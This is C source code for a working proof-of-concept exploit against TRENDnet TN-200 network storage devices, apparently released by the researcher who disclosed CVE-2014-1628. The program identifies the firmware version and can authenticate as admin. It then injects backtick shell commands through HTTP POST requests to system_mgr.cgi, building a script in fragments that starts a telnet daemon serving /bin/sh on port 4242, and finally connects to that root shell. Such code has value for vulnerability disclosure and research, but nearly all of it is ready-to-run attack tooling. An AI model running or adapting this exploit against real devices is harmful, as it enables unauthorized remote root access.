//TRENDnet TN-200/200 T1 PoC Exploit
//Command Injection - CVE-2014-1628
//Discovered and Exploited by Jacob Holcomb/Gimppy
//Twitter @rootHak42

#include <stdio.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <stdlib.h>
#include <unistd.h>
#include <netinet/in.h>
#include <string.h>

#define BUFF_SIZE 2048

//Function declarations
int inputCheck(int, int);
int create_sock(void);
void target_check(int, int);
void version_fprint(struct sockaddr_in *, char **);
void auth_req(struct sockaddr_in *, char *, char **); 
void usage(char *);


int main(int argc, char *argv[]){

    if (!inputCheck(argc, 2)){
        usage(argv[0]);
    }
    //declare sockadd_in variable and pointer
    struct sockaddr_in sock, *sock_struct_ptr;
    sock_struct_ptr = &sock;

    int port = htons(atoi(argv[2]));//Converts unsigned short int to network byte order (big endian).
    int sfd, data, host;
    char data_buffer[BUFF_SIZE];
    //Web pages for web requests
    char *pages[] = {"cgi-bin/system_mgr.cgi", "cgi-bin/login_mgr.cgi"};
    //HTTP POST data for web requests
    char *pdata[] = {"cmd=cgi_log_server&f_enable=1&f_ip=`%s`", 
                     "cmd=login&username=admin&pwd=%s=&ssl=0&port=0"};
    char *telnet = "telnet %s 4242";
    char shell[strlen(telnet)+ strlen(argv[1])];
    //Array of commands to execute (i.e., utelnetd -l /bin/sh -p 4242)
    char *cmds[] = {">/a", "echo -n ut>>a", "echo -n el>>a", "echo -n ne>>a", "echo -n td>>a",
                    "echo -n \\ >>a", "echo -n -l>>a", "echo -n \\ >>a", "echo -n /b>>a",
                    "echo -n in>>a", "echo -n /s>>a", "echo -n h>>a", "echo -n \\ >>a",
                    "echo -n -p>>a", "echo -n \\ >>a", "echo -n 42>>a", "echo -n 42>>a",
                    "sh a"};

    char *req = "POST /%s HTTP/1.1\r\n"
                "Host: %s:%s\r\n"
                "User-Agent: infosec42\r\n"
                "Accept: */*\r\n"
                "Accept-Language: en-US,en;q=0.5\r\n"
                "Accept-Encoding: gzip, deflate\r\n"
                "DNT: 1\r\n"
                "Cookie: username=admin\r\n"
                "Content-Type: application/x-www-form-urlencoded; charset=UTF-8\r\n"
                "Content-Length: %d\r\n"
                "Connection: keep-alive\r\n"
                "Pragma: no-cache\r\n\r\n"
                "%s";

    //assigning socket struct member values
    sock.sin_family = AF_INET;
    sock.sin_port = port;
    host = inet_aton(argv[1], &sock_struct_ptr->sin_addr);//setting sock.sin_addr.s_addr

    target_check(port, host);//Checking destination target/port
    version_fprint(sock_struct_ptr, argv);

    if (argc == 4){
        char web_req[(strlen(req) + strlen(argv[1]) + strlen(argv[2]) + strlen(argv[3]) + strlen(pages[1])+
                     strlen(pdata[1]))];
        memset(web_req, 0, sizeof(web_req));
        snprintf(web_req, (sizeof(web_req)-1), req, pages[1], argv[1], argv[2], (42 + strlen(argv[3])), pdata[1]);
        auth_req(sock_struct_ptr, web_req, argv);
    }

    int i;
    for (i = 0; i < (sizeof(cmds) / sizeof(cmds[0])); i++){
        sfd = create_sock();//Creating socket
        if (connect(sfd, (struct sockaddr *) sock_struct_ptr, sizeof(sock)) < 0){
            perror("\n[!!!] ERROR connecting to target host [!!!]");
            exit(0);
        }

        char web_req[(strlen(req) + strlen(argv[1]) + strlen(argv[2]) + strlen(cmds[i]) + strlen(pages[0]) +
                     strlen(pdata[0]))];
        memset(web_req, 0, sizeof(web_req));
        snprintf(web_req, (sizeof(web_req)-1), req, pages[0], argv[1], argv[2], (37 + strlen(cmds[i])), pdata[0]);
        char sploit[(strlen(web_req) + strlen(cmds[1]))];
        memset(sploit, 0, sizeof(web_req));
        snprintf(sploit, (sizeof(sploit)-1), web_req, cmds[i]);
        printf("\n[*] Sending HTTP POST request %d.\n", (i + 1));
        send(sfd, sploit, strlen(sploit), 0);//Send exploit
        
        if (i < 17){    
            //Receive data
            if ((data = recv(sfd, data_buffer, (sizeof(data_buffer)-1), 0)) < 0){
                perror("\n[!!!] ERROR receiving data [!!!]");
                exit(0);
            }
            else{
                printf("[*] Received %d bytes of data.\n", data);
            }
        }
        close(sfd);
        sleep(2);
    }
    
    printf("\n[--] EXPLOIT COMPLETED [--]\n\n[!!!] Connecting to ro0t shell [!!!]\n\n");
    memset(shell, 0, sizeof(shell));
    snprintf(shell, (sizeof(shell)-1), telnet, argv[1]);

    if (system(shell) < 0)
        perror("[!!!] ERROR connecting to ro0t shell");

    return 0;
}

//Function definitions
void usage(char *prog){

   printf("\n\t-- Firmware Versions >= 1.02 --\nProgram Usage: %s <IP Address> <Port> <Base64 Pass>\n"
          "Program Example: %s 192.168.1.1 80 YWRtaW4=\n"
          "\n\t-- Firmware Versions < 1.02 --\nProgram Usage: %s <IP Address> <Port>\n"
          "Program Example: %s 192.168.1.1 80\n\n", prog, prog, prog, prog);
   exit(0);
}


int inputCheck(int argc, int num){

    if (argc < num + 1){
        return 0;
    }
    else{
        return 1;
    }
}


void target_check(int port, int ip_address){

    if (ip_address == 0){
        printf("\n[!!!] ERROR: Please enter a valid IPv4 address [!!!]\n\n");
        exit(0);
    }
    else{
        printf("\n[*] Destination target was successfully set\n");
    }

    if (port <= 0 || port > 65535){
        printf("\n[!!!] ERROR: Destination port must in the range of 1-65535 [!!!]\n\n");
        exit(0);
    }
    else{
        printf("[*] Destination port was successfully set.\n");
    }
}


int create_sock(void){

    int fd;
    
    if ((fd = socket(AF_INET, SOCK_STREAM, 0)) < 0){
        perror("\n[!!!] ERROR creating socket [!!!]");
        exit(0);
    }

    return fd;
}


//Function to authenticate the admin user (Firmware v1.02)
void auth_req(struct sockaddr_in *sock_ptr, char *req, char *argv[]){

    int sfd;
    char sploit[(strlen(req) + strlen(argv[3]))];
    memset(sploit, 0, sizeof(sploit));
    snprintf(sploit, (sizeof(sploit)-1), req, argv[3]);

    sfd = create_sock();//Creating socket
    if (connect(sfd, (struct sockaddr *) sock_ptr, sizeof(*sock_ptr)) < 0){
        perror("\n[!!!] ERROR connecting to target host [!!!]");
        exit(0);
    }

    printf("\n[*] Sending authentication request.\n");
    send(sfd, sploit, strlen(sploit), 0);//Send auth request
    close(sfd);
    sleep(1);
}


void version_fprint(struct sockaddr_in *sock_ptr, char *argv[]){

    char *loc;
    char buffer[BUFF_SIZE];
    int sfd = create_sock();
    char *req = "GET /xml/info.xml HTTP/1.1\r\n"
                "Host: %s:%s\r\n"
                "User-Agent: infosec42\r\n"
                "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
                "Accept-Language: en-US,en;q=0.5\r\n"
                "Accept-Encoding: gzip, deflate\r\n"
                "DNT: 1\r\n\r\n";

    char sploit[(strlen(req) + strlen(argv[1]) + strlen(argv[2]))];
    memset(sploit, 0, sizeof(sploit));
    snprintf(sploit, (sizeof(sploit)-1), req, argv[1], argv[2]);

    if (connect(sfd, (struct sockaddr *) sock_ptr, sizeof(*sock_ptr)) < 0){
        perror("\n[!!!] ERROR detecting firmware version [!!!]");
        exit(0);
    }
    else{
        send(sfd, sploit, strlen(sploit), 0);
    }

    if (recv(sfd, buffer, (sizeof(buffer)-1), 0) < 0){
        perror("\n[!!!] ERROR receiving data [!!!]");
        exit(0);
    }
    else{
        if ((loc = strstr(buffer, "<version>")) == NULL){
            perror("\n[!!!] ERROR finding version information");
        }
        else{
            char ver[strlen(loc)];
            memset(ver, 0, sizeof(ver));
            memcpy(ver, loc, 23);
            printf("\n[!!!] Firmware version \"%s\" detected. [!!!]\n\n-- Continuing exploitation "
                   "in 10 seconds. Press ctrl + c to halt program execution --\n", ver);
            sleep(10);
        }           
    }
    close(sfd);
}


